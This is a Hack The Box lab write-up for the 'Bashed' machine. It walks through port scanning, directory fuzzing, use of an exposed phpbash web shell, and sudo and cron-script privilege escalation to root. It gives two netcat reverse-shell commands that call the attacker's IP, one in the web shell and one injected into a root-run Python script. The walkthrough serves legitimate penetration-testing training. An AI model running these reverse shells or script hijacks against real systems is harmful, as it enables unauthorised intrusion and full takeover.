---
title: "Bashed"
published: 2026-06-12
draft: false
description: 'Linux Easy machine - Bashed.'
series: 'Hack-The-Box'
tags: ['HTB', 'Linux', 'Sudo', 'PHP', 'Nmap']
difficulty: 'Easy'
osType: 'Linux'
---


- Machine Name: Bashed
- OS Type: Linux
- Difficulty: Easy

### Port Scanning - Service & Version Enumeration

```bash
# Nmap 7.95 scan initiated Wed May  7 09:04:41 2025 as: /usr/lib/nmap/nmap -sVC -p- --open -oN initial/nmap.out -vv 10.10.10.68
Nmap scan report for 10.10.10.68
Host is up, received echo-reply ttl 63 (0.29s latency).
Scanned at 2025-05-07 09:04:42 IST for 117s
Not shown: 65275 closed tcp ports (reset), 259 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May  7 09:06:39 2025 -- 1 IP address (1 host up) scanned in 117.61 seconds
```

## Enumeration

### Port 80/HTTP

i’ll start my enumeration from port 80

![image.png](image.png)

let’s check the web technology using whatweb

```bash
whatweb http://10.10.10.68
```

![image.png](image-1.png)

let’s check the  directory and files fuzzing using gobuster

```bash
gobuster dir -u http://10.10.10.68 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

![image.png](image-2.png)

let’s navigate to /dev directory

![image.png](image-3.png)

we found interesting phpbash.php file google search reveals the →  https://github.com/Arrexel/phpbash

phpbash is a standalone, semi-interactive web shell. It's main purpose is to assist in penetration tests where traditional reverse shells are not possible. The design is based on the default Kali Linux terminal colors, so pentesters should feel right at home.

let’s open the phpbash.php

![image.png](image-4.png)

let’s catch a reverse shell 

start netcat listener on port 443 and run `busybox nc 10.10.14.17 443 -e /bin/bash` in webshell

![image.png](image-5.png)

upgrade to TTY shell using

```bash
python -c 'import pty;pty.spawn("/bin/bash");'
```

[user.t](http://user.tt)xt can be found at /home/arrexel/user.txt

![image.png](image-6.png)

there are two users on the system

![image.png](image-7.png)

after running sudo -l i found that we can run any command as scriptmanager without password using sudo

![image.png](image-8.png)

let’s run /bin/bash as scriptmanager to get shell as scriptmanager

```bash
sudo -u scriptmanager /bin/bash
```

![image.png](image-9.png)

i found interesting /scripts directory in `/` folder

![image.png](image-10.png)

there are two files in this folder, now if we look at the  file owner we found that [test.py](http://test.py) owned by scriptmanager means we can write it to it

and the test.txt is owned by root let’s see what both files contains 

![image.png](image-11.png)

so the [test.py](http://test.py) is writing testing 123 in test.txt so we can assume that script it executed by the root

to confirm this i check last modified time of the file and current system time

![image.png](image-12.png)

both matches mean file is modified every one minutes

let’s modify the [test.py](http://test.py) with following command

```bash
echo -e 'import os;os.system("busybox nc 10.10.14.17 445 -e /bin/bash");' > test.py
```

![image.png](image-13.png)

start netcat listener on port 445

wait for root to execute script

![image.png](image-14.png)